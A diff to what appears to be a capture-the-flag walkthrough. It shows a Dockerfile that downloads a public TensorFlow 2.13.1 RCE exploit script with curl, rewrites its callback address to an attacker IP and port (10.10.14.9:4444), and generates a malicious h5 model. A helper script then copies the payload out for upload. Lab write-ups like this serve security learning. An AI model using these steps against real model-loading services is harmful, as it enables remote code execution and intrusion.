@@ -176,17 +176,17 @@ After some digging on the web I find this RCE for Tensorflow 2.13.1: `https://gi
 
 I add this to the `Dockerfile` build phase:
 ```
-# Download exploit to generate malicious h5 model with payload
+# Download exploit to generate a malicious h5 model containing a payload
 RUN curl -O https://raw.githubusercontent.com/Splinter0/tensorflow-rce/refs/heads/main/exploit.py
 
-# Replace attacker IP and port
+# Replace the attacker IP and port
 RUN sed -i 's/127.0.0.1/10.10.14.9/g' exploit.py && sed -i 's/6666/4444/g' exploit.py
 
-# Generate malicious h5 model with payload
+# Generate the malicious h5 model containing the payload
 RUN python exploit.py
 ```
 
-Then, I generate the malicous h5 with payload.
+Then, I use the `Dockerfile` to build and create a container containing the malicous h5 model with the payload.
 #### generate-payload.sh
 ```
 #!/bin/bash
@@ -206,3 +206,5 @@ CONTAINER_ID=$(sudo docker container ls -aq --filter "ancestor=generate-h5-paylo
 # Download payload from container
 sudo docker cp $CONTAINER_ID:/code/exploit.h5 ./exploit.h5
 ```
+
+Once that's done, I upload the exploit:
